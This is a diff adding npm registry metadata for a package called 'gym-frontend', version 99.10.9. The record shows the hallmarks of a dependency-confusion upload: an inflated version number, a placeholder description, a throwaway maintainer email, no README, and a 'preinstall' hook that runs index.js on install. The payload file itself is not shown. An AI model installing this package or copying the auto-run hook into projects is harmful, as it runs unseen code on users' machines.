@@ -1,0 +1,62 @@
+{
+    "_id": "gym-frontend",
+    "name": "gym-frontend",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "gym-frontend",
+            "version": "99.10.9",
+            "description": "azbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "gym-frontend@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-f4jb5BmOtl7gkYn1/AuuXWLFUSXjJ9t30FFL+jyMBfUB81E88htqHU6DbyklxlAy3Eo3LPVIs8jGUHx68+ivGQ==",
+                "shasum": "05dc01a40f85c0f2f5c774d18ca26d208b0c36b1",
+                "tarball": "https://registry.npmjs.org/gym-frontend/-/gym-frontend-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5064,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPJPPACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmokJw//Xidegz9kF3Mrrxr2Nlxms3SSbj7G34FBZYj+oIpWnYLdWYQO\r\nch1CNCSwfPZBEFKMIytPtSe8mH8cZ0cgPIU6r7n/al1wEpwWCm33QFUipnrt\r\nEu6LWkKxHsTlk4CVepC1LoWZJ21BHkCV6gxz3VKw0yK0YcBHY06yE+HL7brk\r\nNpXIlULecBd79IG0CxEcCGxLM/bnHPzSEoWrqg8Q2mfCFv10E0yAG0Iv+/p9\r\nZ31EHcYEm02n0uk9fxfFKxg966PKgsP7PNmeLWTsPIO72/YSBaKgOSUTyNUu\r\nxc0WK2PytCn+EabYJOodl8u/0/m54QsRPK0d6gs3qZiPqyiI6m10F0k1E2o0\r\nWyUTzsWgoNoYFspJsoPFCKudJVNGiQIxo6H1W368CYkdIH0vb8tWiN+0rUFh\r\n1uXk5o2G58Li9Mm0r20/T4mDBSy+QOWBILrSIM+spGVFBRvzoYA7DnAt8aK+\r\nocLBJxhHfTsXvX5rsDtCeSMnJhicw0Uglvpw8quoajb/i8mkIaksbQ/ev8VZ\r\n5enoKcVGtURD/X9UAyGf/XiNK8lcLXlLPUj3e65WXd2MfRtHO3cgz4yIYTMr\r\nr4IlH7Z4ZL0++V6JlJVtOPkqSmc2J1VjDExYdgYv+eju9yfa8mWYSD8UezK9\r\nFv+7XOxaIsp9KGGzkEX31ttmxtL1xlz72KQ=\r\n=hJtO\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "pt3cbchb",
+                "email": "pt3cbchb@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "pt3cbchb",
+                    "email": "pt3cbchb@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/gym-frontend_99.10.9_1648137167128_0.7295728007437037"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-24T15:52:47.127Z",
+        "99.10.9": "2022-03-24T15:52:47.247Z",
+        "modified": "2022-03-24T15:52:47.337Z"
+    },
+    "maintainers": [
+        {
+            "name": "pt3cbchb",
+            "email": "pt3cbchb@rt11.ml"
+        }
+    ],
+    "description": "azbit package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
